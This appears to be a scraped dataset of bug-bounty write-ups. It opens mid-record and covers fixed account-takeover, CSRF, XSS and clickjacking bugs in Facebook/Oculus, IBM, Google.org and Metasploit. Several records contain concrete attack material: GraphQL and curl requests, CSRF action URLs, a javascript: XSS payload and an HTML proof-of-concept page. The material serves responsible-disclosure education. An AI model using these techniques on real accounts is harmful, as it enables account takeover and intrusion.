&variables={\"input\":{\"client_mutation_id\":1,\"actor_id\":\"FBID\", \"phone_number\":\" +PHONENUMBER \"}} &access_token= VICTIMTOKEN After the confirmation code arrives, we can confirm it using \"ConfirmPhoneCodeMutation\": graph.facebook.com/graphql? doc_id=10153582085808380 &variables= {\"input\":{\"client_mutation_id\":1,\"actor_id\":\"FBID\", \"confirmation_code\":\" CODE \"}}& method=post&access_token= VICTIMTOKEN Finally, reset the victim's password using the attacker's confirmed mobile phone. Timeline: 24th of October, 2017, 03:20 - Report sent to Facebook 24th of October, 2017, 10:50 - First reply from Facebook 24th of October, 2017, 11:30 - Temporary fix for the bug (disabled /facebook_login_sso/ endpoint) 30th of October, 2017 - Bug is now fixed. The fix was to check if the currently logged-in user on Oculus matches the username parameter from the SSO link, which means a login CSRF or response splitting or any other way to set victim's cookies would defeat it. A couple weeks later I found a login CSRF which could also be used to redirect the victim to an Oculus URL I chose - the perfect candidate to bypass the first fix. Steps to reproduce are the same as in the first bug, with an additional one between steps 2 and 3: After getting the /facebook_login_sso/ $LINK , the following request could be made using cURL to auth.oculus.com/nonce-redirect/ curl -v --cookie \"oc_ac_at=..snip..\" --referer \"https://auth.oculus.com/\" -d \"require_token_for=752908224809889&redirect_uri=https://www.oculus.com/account_receivable/?redirect_uri= $LINK \" https://auth.oculus.com/nonce-redirect/ The response contained an /account_receivable/ link with a nonce, which logs the victim into the attacker's Oculus account, and then redirects to the SSO link, skips the OAuth flow, and connects the account. Timeline: 18th of November, 2017, 02:40 - Report sent to Facebook 18th of November, 2017, 05:10 - First reply from Facebook 18th of November, 2017, 10:00 - Temporary fix for the bug (disabled /facebook_login_sso/ endpoint once again) 11th of December, 2017 - Bug is now fixed. This time, the fix was to implement a CSRF check on the /account_receivable/ endpoint, AND add an additional click to confirm the link between Facebook and Oculus accounts. I believe this properly fixes the vulnerability without degrading user experience too much. As always, a big thank you to Facebook for running their bug bounty program. Shout-out to Pete Yaworski for proofreading this blog, and to @phwd for his awesome GraphQL / API write-ups. Random blog post Bug bounties Facebook CSRF leading to full account takeover (fixed) written on October 18th, 2013 Read more Josip Franjković web security consultant I enjoy breaking websites and participating in various bug bounty programs. You can contact me using: @JosipFranjkovic (DM open to everyone) [email protected] keybase.io/josipfranjkovic All rights reserved © 2018. — Josip Franjković"}
{"source_url": "https://www.josipfranjkovic.com/blog/facebook-csrf-full-account-takeover", "title": "Facebook CSRF leading to full account takeover (fixed) -  Josip Franjković", "friendly_explanation": "This is a bug bounty writeup from https://www.josipfranjkovic.com/blog/facebook-csrf-full-account-takeover. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFacebook CSRF leading to full account takeover (fixed) - Josip Franjković Josip Franjković web security consultant Blog Bug bounties Facebook CSRF leading to full account takeover (fixed) written on October 18th, 2013 Some cross site request forgeries are mere annoyance (like logout CSRF), some can be useful (example: changing name of user), and some - like the one I found - can be pretty devastating. This bug has some similarities to Dan Melamed's findings (archive.org link). To exploit this, you need a Facebook account, an Outlook.com (Hotmail) email, and a victim. The Outlook email must not be bound to your Facebook account. When you approve Facebook to access Outlook's contact book, a GET request to https://m.facebook.com/contact-importer/login/?api_instance=1&api_ver=wave5&auth_token=TOKEN is made, which adds the email to your account. This request has no checks; you can repeat it as many times as you want. The problem is, it works for OTHER users too. So, the course of action to take over victim's account would be: Use \"Find contacts on Facebook\" from attacker account and log all requests Find the /contact-importer/login request Remove added email from your (attacker) account Get the victim to somehow make the /contact-importer/login request (infinite possibilities here) Email is now added to victim's account, silently Use \"Forgot your password\" to take over the account Click here for a video demonstrating the vulnerability. Timeline: August 13, 2013, 07:00: Bug reported August 13, 2013, 19:40: Better PoC and video sent to Facebook team August 14, 2013, 01:00: Facebook team replies August 14, 2013, 03:00: Bug is fixed I would like to thank Facebook's security team for running their bug bounty program, and for quickly patching this issue - it took them only 2 hours to roll out working patch. Random blog post Bug bounties Taking over Facebook accounts using Free Basics partner portal written on February 7th, 2018 Read more Josip Franjković web security consultant I enjoy breaking websites and participating in various bug bounty programs. You can contact me using: @JosipFranjkovic (DM open to everyone) [email protected] keybase.io/josipfranjkovic All rights reserved © 2018. — Josip Franjković"}
{"source_url": "https://blog.darabi.me/2015/04/bypass-facebook-csrf.html", "title": "How I bypassed Facebook CSRF Protection\n        | \n        Dynamic World", "friendly_explanation": "This is a bug bounty writeup from https://blog.darabi.me/2015/04/bypass-facebook-csrf.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I bypassed Facebook CSRF Protection | Dynamic World Dynamic World Bug Bounty, Facebook, Writeup, Vulnerability Home About Dynamic World Dynamic World Home About Home vulnerability How I bypassed Facebook CSRF Protection Thursday, April 9, 2015 How I bypassed Facebook CSRF Protection 2015 bounty bug bypass critical CSRF facebook facebook exploit vulnerability Pouya 2:35 AM 36 comments I discovered a critical vulnerability in Facebook that allowed an attacker to bypasses Facebook CSRF protection! more information about CSRF at owasp 'fb_dtsg' Anti-CSRF token supposed to get validated at server-side and if an action request doesn't that token, Facebook will drop the request without any process on it! ( not all actions ;-) ) I start tests on migration flow and before the migration, Facebook show me this URL https://www.facebook.com/ads/manage/home/?account_id=XXXX&show_dialog_uri=/ads/manage/error/graydisabled/?account_id=XXXX in that page, a dialog showed up for update gray account to personal account ! I checked connections in page load and saw a request was sent to \"/ads/manage/error/graydisabled/?account_id=XXXX\" POST /ads/manage/error/graydisabled/?account_id=XXXX HTTP/1.1 Host: www.facebook.com Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Cookie: Content-Type: application/x-www-form-urlencoded account_id =XXXXX __asyncDialog=1 __user= __a=1 __dyn= __req= fb_dtsg= ttstamp= __rev= I looked at this request and something attract me account_id was sent in request URL and body! so I change it to \"https://www.facebook.com/ads/manage/home/?show_dialog_uri=/ads/manage/error/graydisabled/?aaaa=XXXX\" and the request after page load : POST /ads/manage/error/graydisabled/?aaaa=XXXX HTTP/1.1 Host: www.facebook.com Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Cookie: Content-Type: application/x-www-form-urlencoded aaaa =XXXXX __asyncDialog=1 __user= __a=1 __dyn= __req= fb_dtsg= ttstamp= __rev= CSRF Token, custom field in body and a relative URL in Facebook So I used this to bypass Facebook CSRF protection! :D List: All actions could used here,this list is example ----------------------------------------- links are working with this prefix : https://www.facebook.com/ Change language to Persian : /ads/manage/home/?show_dialog_uri=/ajax/settings/account/language.php?new_language=fa_IR Add email [email protected] to account : Account takeover :) /ads/manage/home/?show_dialog_uri=/settings/email/add/submit/ [email protected] turn off login approval /ads/manage/home/?show_dialog_uri=/ajax/settings/security/approvals.php?just_enabled_approvals=0 Logout all mobile /ads/manage/home/?show_dialog_uri=/ajax/settings/mobile/lost_phone.php Logout all sessions /ads/manage/home/?show_dialog_uri=/ajax/settings/security/sessions/stop_all.php After this fix I couldn't change prefix ! show_dialog_uri should have this prefix \"/ads/manage/error/graydisabled/?\" I tried \"/ads/manage/error/graydisabled/?/test/test/\" but after \"?\" all of \"/\" convert to \"%2F\" and I couldn't able to change current directory ! Fnally, I bypassed the fix with double encoding! %253F AsyncDialog remove this char and send request ;) this was the last url : https://www.facebook.com/ads/manage/home/?account_id&show_dialog_uri=%2Fads%2Fmanage%2Ferror%2Fgraydisabled%2F%253F%2F..%2F..%2F..%2F..%2F..%2Fsettings%2Femail%2Fadd%2Fsubmit%2F%3Fnew_email%3Dpouya%40darabi.me \"show_dialog_uri\" removed by Facebook Security Team! ;) Timeline: Mar 29 2015 04:07pm : Initial report Mar 29 2015 09:15pm : Add more details Mar 30 2015 12:57am : Bug acknowledged by security team Mar 30 2015 02:10am : Temporary fix was pushed Mar 30 2015 02:52am : I replay it with a way for bypass Mar 30 2015 03:19am : Bypass blocked Mar 31 2015 07:10am: Facebook Security Team rewarded me with a $15,000. Older Post Newer Post 36 comments : Unknown April 9, 2015 at 5:46 AM Impressive and Nice Catch :) Reply Delete Replies Pouya April 9, 2015 at 11:52 AM Thanks Mohamed ;) Delete Replies Reply Reply Musab -Th3_Pirate April 9, 2015 at 12:00 PM WoooW Great exploit :) Reply Delete Replies Pouya April 9, 2015 at 12:11 PM Thanks :) Delete Replies Reply Reply Unknown April 9, 2015 at 1:24 PM Awesome :) Reply Delete Replies Pouya April 9, 2015 at 1:30 PM thanks :) Delete Replies Reply Reply PermissionRequired April 10, 2015 at 12:14 AM Hi Pouya, Congrats a lot, awesome finding :) It would have also worked even if that account_id parameter didn't appear inside body for parameterless requests, right? Reply Delete Replies Pouya April 10, 2015 at 12:47 AM Hi Thanks :) in first request,yes parameter in query string is enough! Delete Replies Reply PermissionRequired April 10, 2015 at 1:18 AM hmm, logout all mobile & logout all sessions would also work ;) Are those only 2 bugs that made you 2nd in Facebook HOF? Delete Replies Reply Pouya April 10, 2015 at 1:37 AM 2+1 bug ;) Delete Replies Reply PermissionRequired April 10, 2015 at 1:49 AM Oh! So you've already earned more than 23k? Why didn't you write about the other one or is it about to come? hehe, just being curious :) Delete Replies Reply Pouya April 10, 2015 at 2:12 AM yes, in future, I will write about other bug i found! Delete Replies Reply Reply BestCoder April 11, 2015 at 10:42 AM Congrats pouya ;) Reply Delete Replies Pouya April 12, 2015 at 8:27 AM Thank You :D Delete Replies Reply Reply shailesh suthar April 12, 2015 at 12:01 PM Awesome and impressive catch :) Reply Delete Replies Pouya April 13, 2015 at 1:21 AM Thank you Shailesh :) Delete Replies Reply Reply Unknown April 13, 2015 at 12:34 AM Nice one sir :D Reply Delete Replies Pouya April 13, 2015 at 1:21 AM Thanks ;) Delete Replies Reply Reply Unknown June 2, 2015 at 7:35 AM nice catch ! awesome ! Reply Delete Replies Reply Unknown August 13, 2015 at 4:27 PM Awesome Vulnerability Hunting ;-) Reply Delete Replies Pouya August 15, 2015 at 2:31 PM Thanks bro ;) Delete Replies Reply Reply abdodz August 29, 2015 at 5:58 AM nace work rabi wafag Reply Delete Replies Reply Unknown October 10, 2015 at 10:21 AM Great find. Reply Delete Replies Reply Unknown November 20, 2015 at 2:14 AM This comment has been removed by the author. Reply Delete Replies Reply Unknown November 20, 2015 at 11:03 PM Nice hunting Reply Delete Replies Reply Unknown December 24, 2015 at 3:51 PM nice work man Reply Delete Replies Reply Unknown February 29, 2016 at 8:49 PM It was a nice find great work Reply Delete Replies Reply Shalini Chauhan March 15, 2016 at 10:21 PM Common Sense prevails...good catch buddy :) Reply Delete Replies Reply Unknown May 28, 2016 at 2:11 PM Salam Khoshhal misham agar research+bug+... dar zone amniat dashtid baraie ma ham ersal konid :) www.securitylab.ir Reply Delete Replies Pouya June 11, 2016 at 5:37 AM Salam Hatman ;) Delete Replies Reply Reply Anonymous December 20, 2016 at 5:34 PM This comment has been removed by the author. Reply Delete Replies Reply Anonymous December 20, 2016 at 5:36 PM Nice finding. Between Couldn't have the CRLF injection worked here? Reply Delete Replies Pouya December 29, 2016 at 7:51 AM Thanks, no it wasn't vulnerable to such attacks Delete Replies Reply Reply Anonymous January 29, 2017 at 8:10 AM I like to know how can i use this trick against \"facebook dialog box\" to click to confirmation button programaticaly? Reply Delete Replies Reply Unknown June 6, 2018 at 5:54 PM This comment has been removed by the author. Reply Delete Replies Reply Jakirrul technology September 20, 2020 at 8:00 AM thank you for your blog .wish you all the best . Facebook Reply Delete Replies Reply Add comment Load more... Subscribe to: Post Comments ( Atom ) Popular Posts How I bypassed Facebook CSRF Protection I discovered a critical vulnerability in Facebook that allowed an attacker to bypasses Facebook CSRF protection! more informa... Image removal vulnerability in Facebook polling feature Delete any Image on Facebook When I was checking out facebook's new features, I noticed that polling feature were adde... How I bypassed Facebook CSRF once again! I found a vulnerability in Facebook that allowed me to create arbitrary form in Facebook that send a POST request with CSRF token... Create post on any Facebook page Create an invisible post on any Facebook page You may know that you can create many types of posts on your Facebook feed. one of them is c... Bypass ad account roles vulnerability 2015 I discovered a vulnerability in Facebook that allowed a normal user in ad account to get unauthorized admin access in that ad a... Another image removal vulnerability on Facebook Delete any Image on Facebook using Series Feature I noticed the Series Feature was added to Facebook Creator Studio therefor I start diggin... Media deletion CSRF vulnerability on Instagram Media deletion CSRF vulnerability on Instagram I noticed a copyright section has been added to instagram. whenever a user violated a... Category 2015 2016 2017 2020 ads bounty bug bugbounty business bypass critical CSRF exploit facebook facebook exploit hack instagram privacy roles vulnerability Blog Archive ► 2021 ( 1 ) ► January ( 1 ) ► 2020 ( 1 ) ► June ( 1 ) ► 2019 ( 1 ) ► December ( 1 ) ► 2017 ( 1 ) ► November ( 1 ) ► 2016 ( 1 ) ► May ( 1 ) ▼ 2015 ( 2 ) ▼ April ( 1 ) How I bypassed Facebook CSRF Protection ► March ( 1 ) © 2024 Copyright Dynamic World Powered by Blogger Template Design by fostrap"}
{"source_url": "https://medium.com/bugbountywriteup/critical-bypass-csrf-protection-on-ibm-313ffb68dd0c", "title": "[Critical] Bypass CSRF protection on IBM | by Mohamed Sayed | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/critical-bypass-csrf-protection-on-ibm-313ffb68dd0c. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n[Critical] Bypass CSRF protection on IBM | by Mohamed Sayed | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication [Critical] Bypass CSRF protection on IBM Mohamed Sayed 2 min read · Oct 9, 2018 -- 1 Listen Share IBM What is CSRF attack? CSRF is an attack that tricks the victim to send a malicious request this request can change the victim information like Email, Username, Passwords and etc… What did I found on IBM? when trying to change my email on my test account I notice that the website change it by using a GET request ( https://www.ibm.com/ibmweb/myibm/account/sendmail?locale=us-en&email =NEW_EMAIL ) this link used to change the email so I didn’t notice any CSRF token to protect the website from the CSRF attack I try to exploit it but it’s not worked because of the website check the Referer Header :( I was like: but I tried more and after a few hours I found a Bypass to this protection when I change the Referer Header value it returned an error but when I use this value it returned true ( https://www.ibm.com/ibmweb/myibm/profile/profile-edit.jsp ) so I tried to spoof this protection and I found a bypass by using this URL ( http://my_website/www.ibm.com/ibmweb/myibm/profile/profile-edit.jsp.php ) what I did is make the valid URL as a path on my website so now the request will be sent from ( profile-edit.jsp.php )to the IBM website to change the email when I try this method it worked I was like: So now I can steal the accounts of IBM users by just visit my website :P. POC Video: Report Sent: Sep 14th Triaged on: Sep 28th Solved on: Oct 8th I hope that this topic helped someone and I want to thank @ zseano for helping me . Security Hacking Cybersecurity Bug Bounty -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Mohamed Sayed 549 followers · 36 following My name is Mohamed my nickname is Flex, I’m a Bug Hunter at HackerOne and Synack Red Team Member. Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@godofdarkness.msf/google-apis-clickjacking-1337-7a3a9f3eb8df", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@godofdarkness.msf/google-apis-clickjacking-1337-7a3a9f3eb8df. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://websecblog.com/vulns/clickjacking-xss-on-google-org/", "title": "Clickjacking DOM XSS on Google.org - Web Security Blog", "friendly_explanation": "This is a bug bounty writeup from https://websecblog.com/vulns/clickjacking-xss-on-google-org/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nClickjacking DOM XSS on Google.org - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me Clickjacking DOM XSS on Google.org by Thomas Orlita Vulnerabilities August 12, 2019 June 10, 2022 One of the lesser-known Google projects is Google Crisis Map . It was created to help people find and use critical emergency information. [source] Although it is still working, it doesn’t seem to be used much anymore. Since it’s an older project (created in 2012) and not updated often, it’s a great target to look for vulnerabilities. It’s hosted on the google.org domain, which doesn’t have as big a severity as google.com (for client-side vulnerabilities), but it’s still a domain owned by Google. Logging in If you go to the project’s home page ( google.org/crisismap ), you’ll get redirected to the default map “Weather and Events”. This isn’t very interesting for us since the only thing we can do is view the map. There is a way to manage and create new maps. It can be accessed if we add .maps at the end of the URL: google.org/crisismap/.maps Once you open this page, you’ll need to log in with your Google account to continue. Now you should see a dashboard with a list of maps. There are three default maps for every account. For some reason, if you publish one of these maps on your own domain, everyone will see that in the dashboard under the “Published Map” field. Creating a map If you click on the red “Create Map” button, you’ll most likely see a message that the gmail.com domain can’t be used for creating new maps. This means we need to log in using an email with our custom domain. We can do this either by logging in with a GSuite account or an email that uses a domain other than gmail.com. After that, we can create a new map. After clicking the “Continue” button, we’ll get redirected to a page where we can edit the newly created map. Finding the XSS First, we’ll add a new layer to the map. A dialog for creating a new layer will pop up. We’ll enter anything as the “Title”. Now if we enter javascript:alert(document.domain) into the “Source URL” field, it’ll show an error: Invalid URL – please include a protocol (e.g. http:// or https://) This means it checks if the URL is valid before it allows you to save the new layer. The deobfuscated JavaScript code that validates the URL looks like this: if (url && !url.toLowerCase().match(\"^\\\\s*(http://|https://|docs://|$)\")) { showError(\"Invalid URL - please include a protocol (e.g. http:// or https://)\"); } But this is only validation on the client-side before the actual save request is sent to the backend. Modifying the request We can use a web debugging proxy like Fiddler or Burp Suite to modify the request and send the modified version instead. First, we need to change the “Source URL” to a valid URL, e.g. https://example.com . We’ll click the “OK” button and click “Save” to send the save request. Then we’ll modify the request. This is what the request looks like: POST https://google.org/crisismap/.api/maps/1234 { \"id\": \"1234\", \"title\": \"Untitled map\", \"base_map_type\": \"GOOGLE_ROADMAP\", \"layers\": [{ \"id\": \"1\", \"title\": \"Test layer\", \"visibility\": \"DEFAULT_ON\", \"type\": \"KML\", \"source\": { \"kml\": { \"url\": \"https://example.com\" } } }] } We’ll replace https://example.com with javascript:alert(document.domain) and send this modified request. Testing the XSS The request is now sent and saved, so we’ll reload the page. Open “Layers” and click on “Download KML”. After we click on the download link, the XSS is fired and the alert box pops up with the domain name! How to fix this Why did this happen? The URL validation happened only on the frontend and not in the backend. That means this could be fixed by validating the URL in the backend as well. But this is not the way Google decided to fix it. Instead of checking the URL when saving it in the backend, the URL is now validated before displaying in the DOM. So if the URL isn’t valid, it won’t be used as the link. It’ll use a meaningless value like about:invalid instead. <a href=\"about:invalid#zClosurez\">Download KML</a> The impact Okay, so we have a link that points to a javascript: URI containing the payload. The link is on a page to manage the map. And you must log in and have permission to access the page. Clearly, this is self-XSS since only we are able to get this XSS executed. Now how do we get from self-XSS to a real XSS? Increasing the severity Every map we create can be published to be viewed by the public. If you’re logged in via an email with the domain example.com , you can publish the map to the URL https://google.org/crisismap/example.com/test . Anyone can open this URL and view the map we’ve created. To get the XSS working, the user would have to open or be navigated to this page, open the “Layers” view and then click the “Download KML” link. This means it’d no longer be self-XSS, but it’s still too many steps the user would have to make for this XSS to be useful. Clickjacking If we take a look at the response HTTP headers, we can see that google.org doesn’t send the X-Frame-Options header. Response headers from google.org Response headers from google.com The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> , <iframe> , <embed> or <object> . Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites. — MDN web docs The (intentional) lack of this HTTP header on google.org means we can embed the published map into an iframe on our own website. <iframe src=\"https://google.org/crisismap/example.com/test\"></iframe> This is how it’ll look like. In order to fire the XSS the user now doesn’t have to even leave our website. But they’d still need to click on two places in the iframe (“ Layers ” > “ Download KML “). The iframe is loaded on our website – that means we can use CSS and JavaScript to manipulate it. The first thing that came to my mind was to put black DIVs around the point where we want the user to click. Then detect a click and move the DIV to the second point. This worked well but it still requires the user to click on two different locations. But a more efficient solution would be to position the iframe absolutely with CSS so the user doesn’t have to move the cursor at all. Below is was a live demo. Unfortunately, Google Crisis Map has been discontinued so the live demo won’t work anymore. You can see how it looked like in the video . It scales the iframe 50× and moves it to the position we want the user to click. First to the “Layers” tab. After a click, it moves over the link with the payload. It was possible to execute the XSS by clicking two times somewhere in the iframe . We could even overlay the iframe with an opaque div with pointer-events disabled, so the user would have no idea they are clicking in the iframe. For the sake of the sample and the fact that this vulnerability is already fixed, the link goes to https:// and not javascript: URI. Conclusions There are several things to be taken from here. Never trust user input. Always check (on the backend) if it’s valid before saving it. Make sure to properly sanitize it depending on the context it will be in. Don’t allow other domains to embed your website in an iframe by correctly setting the X-Frame-Options header. When looking for vulnerabilities, try to find the highest possible severity of the vulnerability. For example, if you find an XSS, try making it into an account takeover by finding incorrectly configured cookies or endpoints. Don’t be afraid to look for older projects that still fit into the scope of the Bug Bounty program. Timeline 2018-12-09 Vulnerability reported 2018-12-10 Priority changed to P1 2018-12-10 Looking into it 2018-12-10 Nice catch 2018-12-11 Reward issued Written by Thomas Orlita Follow me on Twitter: @ThomasOrlita / Mastodon: @ThomasOrlita@infosec.exchange Post Navigation Previuos Article Previous Article: XSSing Google Employees — Blind XSS on googleplex.com Next Article Listing all registered email addresses on Google’s Crisis Map thanks to IDOR and incremental IDs Related Articles How to use Google’s CSP Evaluator to bypass CSP by Thomas Orlita in Vulnerabilities Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org by Thomas Orlita in Vulnerabilities Angular XSS vulnerability on McDonalds.com by Thomas Orlita in Vulnerabilities Inserting arbitrary files into anyone’s Google Earth Studio Projects Archive by Thomas Orlita in Vulnerabilities Web Security Blog by Thomas Orlita Digital Download | Developed by Rara Theme . Powered by WordPress ."}
{"source_url": "https://medium.com/@osamaavvan/account-taker-with-clickjacking-ace744842ec3", "title": "Account Takeover with Clickjacking | by Osama Avvan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@osamaavvan/account-taker-with-clickjacking-ace744842ec3. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAccount Takeover with Clickjacking | by Osama Avvan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Account Takeover with Clickjacking Osama Avvan 2 min read · Jun 19, 2019 -- 1 Listen Share This writeup is about how I was able to change other users account email with clickjacking. It was a private program on Bugcrowd. The Profile page of the site allows the user to change their email and there was no X-Frame Header on that page so the profile page can be loaded in an iframe. The profile page URL was http://example.com/mi-cuenta/mi-perfil/ the page contains a form with an email field which was prefilled with the current email, so out of curiosity I just added an email parameter in the URL to check if the specified email in the parameter is being inputted in the email field and yes it worked. http://example.com/mi-cuenta/mi-perfil?email=hacked@gmail.com Press enter or click to view image in full size Now everything was set up, I just needed to load this URL in an iframe and make the user click on the Update button to change their email. So I created an HTML page for that to trick user into clicking that Update button. Press enter or click to view image in full size I loaded the URL in an iframe and created a <div> tag with the text Click here and positioned it above the Update button, so now when the User will click on Click here the Update button below it will be clicked. Which will change the User Email. Press enter or click to view image in full size This is the final look after setting the iframe opacity to 0, so now after clicking on the Click here text User email will be changed, and I can request a new password for the account with that email. So that is it, Always try to look for opportunities, even small vulnerabilities can have a larger impact, Thanks for Reading. Press enter or click to view image in full size JavaScript Bug Bounty Bug Hunting Bugcrowd -- -- 1 Written by Osama Avvan 1.1K followers · 0 following Security Researcher, ❤️ To Code. Find me at: https://twitter.com/osamaavvan Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.seekurity.com/blog/general/metasploit-web-project-kill-all-running-tasks-csrf-cve-2017-5244/", "title": "Vulnerability in Metasploit Project aka CVE-2017-5244 – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/metasploit-web-project-kill-all-running-tasks-csrf-cve-2017-5244/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nVulnerability in Metasploit Project aka CVE-2017-5244 – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in General , PoC Gallery , Write Ups Tweet Share Read later Vulnerability in Metasploit Project aka CVE-2017-5244 Mohamed A. Baset comment 2 Comments access_time 6 min read Hi Guys, I hope you all are fine and doing well. Yes you read it right, We managed to find a vulnerability in a framework used to exploit vulnerabilities! “Today is me tomorrow will be you” 🙂 Today we will talk about a CSRF vulnerability affects the web application of both versions (Express, Community and Professional) of Metasploit Project. But first what is Metasploit? (Seriously maybe somebody out there don’t know about it yet :D) The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. Its best-known sub-project is the open source Metasploit Framework, a tool for developing and executing exploit code against a remote target machine. Other important sub-projects include the Opcode Database, shellcode archive and related research. The Metasploit Project is well known for its anti-forensic and evasion tools, some of which are built into the Metasploit Framework. Metasploit was created by H. D. Moore in 2003 as a portable network tool using Perl. By 2007, the Metasploit Framework had been completely rewritten in Ruby. On October 21, 2009, the Metasploit Project announced that it had been acquired by Rapid7, a security company that provides unified vulnerability management solutions. Like comparable commercial products such as Immunity’s Canvas or Core Security Technologies’ Core Impact, Metasploit can be used to test the vulnerability of computer systems or to break into remote systems. Like many information security tools, Metasploit can be used for both legitimate and unauthorized activities. Since the acquisition of the Metasploit Framework, Rapid7 has added two open core proprietary editions called Metasploit Express and Metasploit Pro. Metasploit’s emerging position as the de facto exploit development framework led to the release of software vulnerability advisories often accompanied by a third party Metasploit exploit module that highlights the exploitability, risk and remediation of that particular bug. Metasploit 3.0 began to include fuzzing tools, used to discover software vulnerabilities, rather than just exploits for known bugs. This avenue can be seen with the integration of the lorcon wireless (802.11) toolset into Metasploit 3.0 in November 2006. Metasploit 4.0 was released in August 2011. This CSRF vulnerability can be used to perform an attack against all the running “Scans and Tasks” by metasploit project. When we discovered this issue we’ve called it “The metasploit firewall”, So funny isn’t it! But why? If you hosted a page with the blew proof of concept code on your local/ web server index you will be tricking Metasploit scanning session to load this page (of course to scan it) hence kill all the running tasks. A firewall? hmmm kind of! ( Update : We thought it might be a valid attack vector but after some investigations it turned to be not because the crawler used by metasploit is not authenticated with the metasploit session itself) Usability issue : There have to be an option to resume the stopped tasks to not to lose it at all after performing such attack. Metasploit team comment about the issue: CVE-2017-5244 (CWE-352: Cross-Site Request Forgery): Metasploit commercial editions allowed GET requests to the stop and stop_all (task) routes. This should not have been the case, as they change the state of the service, and should have been only allowed through POST requests. In addition, the origin of the requests was not verified until after processing. This could have allowed an attacker to stop one, or all, Metasploit tasks by getting an authenticated user to run JavaScript (e.g. via loading a malicious URL). Now the routes are only exposed to POST requests, which validate the presence of a secret token to prevent CSRF attacks (via Rails’ protect_from_forgery). This vulnerability was kindly reported to Rapid7 by Mohamed A. Baset (Founder and Cyber Security Advisor at Seekurity.com SAS de C.V. Mexico; @SymbianSyMoh). Rapid7 made a public advisory with more technical details you can read about it here: https://community.rapid7.com/community/metasploit/blog/2017/06/14/r7-2017-16-cve-2017-5244-lack-of-csrf-protection-for-stopping-tasks-in-metasploit-pro-express-and-community-editions-fixed And here is our advisory details: # Exploit Title: Metasploit Web Project Kill all running tasks CSRF # Date reported: 27-5-2017 # Exploit Author: Seekurity SAS de C.V. – Mohamed Abdelbasset Elnouby (@SymbianSyMoh) # Vendor Homepage: http://www.metasploit.com/ # Software Link: https://www.rapid7.com/products/metasploit/download/editions/ # Affected Versions: Express, Community and Pro < 4.14.0 (Update 2017051801) # CVE number: CVE-2017-5244 Vulnerability: Cross Site Request Forgery – (CSRF) / Improper Anti-CSRF token validation Vulnerability reference : http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) Video PoC: Impact: After doing some research, i have found that the anti csrf token “authenticity_token” value is not validated from the local server side which will result in a csrf attack and kills all the currently running metasploit tasks (with no ability to resume). Attack vectors: Attackers can target a local metasploit user and use the PoC code to stop/kill all the running metasploit tasks, or by other MITM tricks like injecting the PoC code into the network traffic which will cause the same exact impact. PoC Code: <!DOCTYPE html> <html> <head> <title>Metsploit Asset Firewall - Kill all running tasks bug PoC</title> </head> <h1>Metsploit Asset Firewall - Kill all running tasks bug PoC by Mohamed A. Baset - @Seekurity</h1> <h2 style=\"color: red\">Killing all running metasploit tasks after 5 seconds...</h2> <script> setInterval(function(){ window.location.replace(\"https://127.0.0.1:3790/tasks/stop_all\"); }, 5000); </script> <body> </body> </html> Disclosure Timeline Sat, May 27, 2017: Vulnerability reported to Rapid7 by Mohamed A. Baset Tue, May 30, 2017: Vulnerability confirmed by Rapid7 Fri, June 9, 2017: Vulnerability fixed by Rapid7 Sun, June 11, 2017: Rapid7 assigned CVE-2017-5244 to this vulnerability Wed, June 14, 2017: Rapid7 released patch; public disclosure Wed, June 14, 2017: Rapid7 reported vulnerability to MITRE (planned) Many thanks to Samuel Huckins (Program Manager at Rapid7) who kept us updated and in a great and professional way! Hey! Building a website, an application or any kind of business? Or already have one? Worried about your security? Think twice before going public and let us protect your business ! aka all CVE-2017-5244 in kill leads Metasploit Project running tasks the to Vulnerability web Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Pingback: CVE-2017-5244 – 安百科技 Pingback: 2017.06.16 - Daily Security Issue > ReverseNote Next article Godaddy XSS affects parked domains redirector/processor! Translate this blog Scroll Up"}
